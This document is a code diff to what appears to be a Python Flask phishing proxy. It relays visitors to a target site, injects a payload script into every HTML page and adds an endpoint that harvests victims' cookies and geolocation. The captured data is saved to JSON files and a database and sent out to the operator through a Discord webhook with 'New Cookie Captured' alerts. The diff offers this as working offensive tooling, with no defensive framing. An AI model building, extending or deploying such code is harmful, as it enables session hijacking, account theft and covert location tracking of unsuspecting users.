@@ -6,6 +6,7 @@ from core.database import Database
 from core.detection import DataDetector
 from core.discord_bot import DiscordBot
 from colorama import Fore
+from functools import wraps
 
 # Initialize components
 db = Database()
@@ -37,17 +38,110 @@ ensure_json_files()
 requests_history = []
 MAX_HISTORY = 50
 
+class ProxyError(Exception):
+    """Custom exception for proxy-related errors"""
+    pass
+
+def error_handler(func):
+    """Decorator for handling errors in routes"""
+    @wraps(func)
+    def wrapper(*args, **kwargs):
+        try:
+            return func(*args, **kwargs)
+        except requests.exceptions.SSLError:
+            return jsonify({
+                'status': 'error',
+                'message': 'SSL Certificate verification failed'
+            }), 502
+        except requests.exceptions.ConnectionError:
+            return jsonify({
+                'status': 'error',
+                'message': 'Failed to connect to target server'
+            }), 504
+        except ProxyError as e:
+            return jsonify({
+                'status': 'error',
+                'message': str(e)
+            }), 400
+        except Exception as e:
+            print(f"[!] Unexpected error: {str(e)}")
+            return jsonify({
+                'status': 'error',
+                'message': 'Internal server error'
+            }), 500
+    return wrapper
+
 def start_proxy(target, host, port, secret):
     app = Flask(__name__, static_folder='panel', static_url_path='')
 
-    # Serve panel files
-    @app.route(f'/{secret}')
-    def panel_index():
-        return send_from_directory('panel', 'index.html')
+    # Remove 'www.' if present and any protocol
+    target = target.replace('www.', '').replace('http://', '').replace('https://', '')
 
-    @app.route(f'/{secret}/<path:filename>')
-    def panel_files(filename):
-        return send_from_directory('panel', filename)
+    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+    def proxy(path):
+        if path.startswith(secret):
+            return send_from_directory('panel', 'index.html')
+
+        # Build target URL
+        target_url = f"https://{target}/{path}"
+        
+        # Forward headers but exclude some
+        headers = {
+            key: value for key, value in request.headers if key.lower() not in [
+                'host', 
+                'content-length',
+                'connection'
+            ]
+        }
+        headers['Host'] = target
+
+        try:
+            # Make the request to the target
+            resp = requests.request(
+                method=request.method,
+                url=target_url,
+                headers=headers,
+                params=request.args,
+                data=request.get_data(),
+                cookies=request.cookies,
+                allow_redirects=False,
+                verify=False
+            )
+
+            # Process response
+            excluded_headers = [
+                'content-encoding', 
+                'content-length', 
+                'transfer-encoding', 
+                'connection'
+            ]
+            headers = [
+                (name, value) 
+                for (name, value) in resp.raw.headers.items() 
+                if name.lower() not in excluded_headers
+            ]
+
+            # Inject payload if HTML
+            response = resp.content
+            if 'text/html' in resp.headers.get('Content-Type', ''):
+                try:
+                    decoded = response.decode('utf-8')
+                    if '</head>' in decoded:
+                        payload = '<script src="/payload-script.js"></script>'
+                        decoded = decoded.replace('</head>', f'{payload}</head>')
+                    elif '<body>' in decoded:
+                        payload = '<script src="/payload-script.js"></script>'
+                        decoded = decoded.replace('<body>', f'<body>{payload}')
+                    response = decoded.encode('utf-8')
+                except UnicodeDecodeError:
+                    pass
+
+            return Response(response, resp.status_code, headers)
+
+        except Exception as e:
+            print(f"Proxy Error: {str(e)}")
+            return f"Error: {str(e)}", 500
 
     # Serve payload script
     @app.route('/payload-script.js')
@@ -184,29 +278,49 @@ def start_proxy(target, host, port, secret):
         data = request.json
         user_ip = request.remote_addr
         
-        # Get detailed geolocation data
-        geo_data = detector.get_geolocation(user_ip)
-        if geo_data:
-            db.save_geolocation(
-                user_ip,
-                data.get('lat', geo_data.get('lat')),
-                data.get('lon', geo_data.get('lon')),
-                geo_data.get('country', 'Unknown'),
-                geo_data.get('city', 'Unknown')
-            )
-            
-            if discord_bot and discord_bot.webhook_url:
-                discord_bot.send_webhook({
-                    "embeds": [{
-                        "title": "📍 New Geolocation Data",
-                        "fields": [
-                            {"name": "IP", "value": user_ip, "inline": True},
-                            {"name": "Location", "value": f"{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}", "inline": True},
-                            {"name": "Coordinates", "value": f"Lat: {data.get('lat', 'N/A')}\nLon: {data.get('lon', 'N/A')}", "inline": True}
-                        ]
-                    }]
-                })
-
+        # Save to database
+        db.save_geolocation(
+            user_ip,
+            data.get('lat'),
+            data.get('lon'),
+            data.get('country', 'Unknown'),
+            data.get('city', 'Unknown')
+        )
+        
+        # Save to JSON file
+        try:
+            with open('geolocation.json', 'r') as f:
+                locations = json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            locations = []
+        
+        locations.append({
+            **data,
+            'ip': user_ip
+        })
+        
+        with open('geolocation.json', 'w') as f:
+            json.dump(locations, f)
+        
+        # Send Discord alert
+        if discord_bot:
+            discord_bot.send_webhook({
+                "embeds": [{
+                    "title": "📍 New Location Captured",
+                    "color": 0x00ff00,
+                    "fields": [
+                        {"name": "IP", "value": user_ip, "inline": True},
+                        {"name": "Latitude", "value": str(data.get('lat', 'N/A')), "inline": True},
+                        {"name": "Longitude", "value": str(data.get('lon', 'N/A')), "inline": True},
+                        {"name": "Country", "value": data.get('country', 'Unknown'), "inline": True},
+                        {"name": "City", "value": data.get('city', 'Unknown'), "inline": True},
+                        {"name": "URL", "value": data['url'], "inline": False},
+                        {"name": "Source", "value": data.get('source', 'browser'), "inline": True}
+                    ],
+                    "timestamp": data['timestamp']
+                }]
+            })
+        
         return jsonify({'status': 'success'}), 200
 
     @app.route('/ep/api/test_discord', methods=['POST'])
@@ -413,60 +527,57 @@ def start_proxy(target, host, port, secret):
         except Exception as e:
             return jsonify({'status': 'error', 'message': str(e)}), 500
 
-    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
-    def proxy(path):
-        target_url = f"https://{target}/{path}"
-        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
-        headers['Host'] = target
-
-        try:
-            resp = requests.request(
-                method=request.method,
-                url=target_url,
-                headers=headers,
-                params=request.args,
-                data=request.get_data(),
-                cookies=request.cookies,
-                allow_redirects=False,
-                verify=False
+    @app.route('/ep/api/cookies', methods=['POST'])
+    @error_handler
+    def handle_cookies():
+        data = request.json
+        user_ip = request.remote_addr
+        
+        # Save to database
+        for cookie in data['cookies']:
+            db.save_cookie(
+                cookie['name'],
+                cookie['value'],
+                user_ip,
+                cookie['domain']
             )
-
-            # Log request
-            request_log = {
-                'timestamp': datetime.now().isoformat(),
-                'method': request.method,
-                'path': path,
-                'status_code': resp.status_code,
-                'ip': request.remote_addr
-            }
-            requests_history.append(request_log)
-            if len(requests_history) > MAX_HISTORY:
-                requests_history.pop(0)
-
-            # Process response
-            excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
-            headers = [(name, value) for (name, value) in resp.raw.headers.items() if name.lower() not in excluded_headers]
-
-            # Inject payload if HTML
-            response = resp.content
-            if 'text/html' in resp.headers.get('Content-Type', ''):
-                try:
-                    response = response.decode('utf-8')
-                    if '</head>' in response:
-                        payload = '<script src="/payload-script.js"></script>'
-                        response = response.replace('</head>', f'{payload}</head>')
-                    elif '<body>' in response:
-                        payload = '<script src="/payload-script.js"></script>'
-                        response = response.replace('<body>', f'<body>{payload}')
-                    response = response.encode('utf-8')
-                except UnicodeDecodeError:
-                    pass  # Skip injection if we can't decode the response
-
-            return Response(response, resp.status_code, headers)
-
-        except Exception as e:
-            return f"Error: {str(e)}", 500
+        
+        # Save to JSON file
+        try:
+            with open('cookies.json', 'r') as f:
+                cookies = json.load(f)
+        except (FileNotFoundError, json.JSONDecodeError):
+            cookies = []
+        
+        cookies.extend([{
+            **cookie,
+            'ip': user_ip,
+            'timestamp': data['timestamp']
+        } for cookie in data['cookies']])
+        
+        with open('cookies.json', 'w') as f:
+            json.dump(cookies, f)
+        
+        # Send Discord alert
+        if discord_bot:
+            for cookie in data['cookies']:
+                discord_bot.send_webhook({
+                    "embeds": [{
+                        "title": "🍪 New Cookie Captured",
+                        "color": 0xff0000,
+                        "fields": [
+                            {"name": "Name", "value": cookie['name'], "inline": True},
+                            {"name": "Value", "value": cookie['value'][:100] + "..." if len(cookie['value']) > 100 else cookie['value'], "inline": True},
+                            {"name": "Domain", "value": cookie['domain'], "inline": True},
+                            {"name": "URL", "value": data['url'], "inline": False},
+                            {"name": "IP", "value": user_ip, "inline": True},
+                            {"name": "User Agent", "value": data['userAgent'], "inline": False}
+                        ],
+                        "timestamp": data['timestamp']
+                    }]
+                })
+        
+        return jsonify({'status': 'success'}), 200
 
     ssl_context = None  # Remove SSL for now to get basic functionality working
     app.run(host=host, port=port)
